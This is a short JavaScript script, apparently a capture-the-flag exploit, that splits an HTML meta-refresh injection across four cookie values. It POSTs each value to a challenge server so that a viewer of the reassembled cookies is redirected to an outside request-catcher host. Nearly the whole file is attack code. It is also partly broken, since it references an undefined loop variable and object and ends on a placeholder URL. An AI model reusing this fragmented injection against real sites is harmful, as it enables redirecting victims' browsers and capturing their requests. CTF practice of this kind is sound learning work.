// Function to make a POST request with fetch
async function makePostRequest(url, data) {
    const response = await fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    });
    return await response.json();
}
const metaCookies1 = 'a=<meta ';
const m2 = ' http-equiv="refresh" ';
const m3 = ' content="0' ;
const m4 = 'url=https://hi.requestcatcher.com/">';


    const url = 'http://host3.metaproblems.com:6020/index.php'; 
    const data1 = { cookie_name: `cookie_${i}`, value: metaCookies1};
    const data2 = { cookie_name: `cookie_${i}`, value: m2};
    const data3 = { cookie_name: `cookie_${i}`, value: m3};
    const data4 = { cookie_name: `cookie_${i}`, value: m4};

    
    makePostRequest(url, data1)
        .then(response => {
            console.log(`Cookie set: ${data.cookie}=${data.value}`);
        })
        .catch(error => {
            console.error('Error setting cookie:', error);
        });
        makePostRequest(url, data2)
        .then(response => {
            console.log(`Cookie set: ${data.cookie}=${data.value}`);
        })
        .catch(error => {
            console.error('Error setting cookie:', error);
        });
        makePostRequest(url, data3)
        .then(response => {
            console.log(`Cookie set: ${data.cookie}=${data.value}`);
        })
        .catch(error => {
            console.error('Error setting cookie:', error);
        });
        makePostRequest(url, data4)
        .then(response => {
            console.log(`Cookie set: ${data.cookie}=${data.value}`);
        })
        .catch(error => {
            console.error('Error setting cookie:', error);
        });

// Redirect to view cookie URL after setting cookies
window.location.href = 'view_cookie_url';  // Replace with the actual URL to view cookies
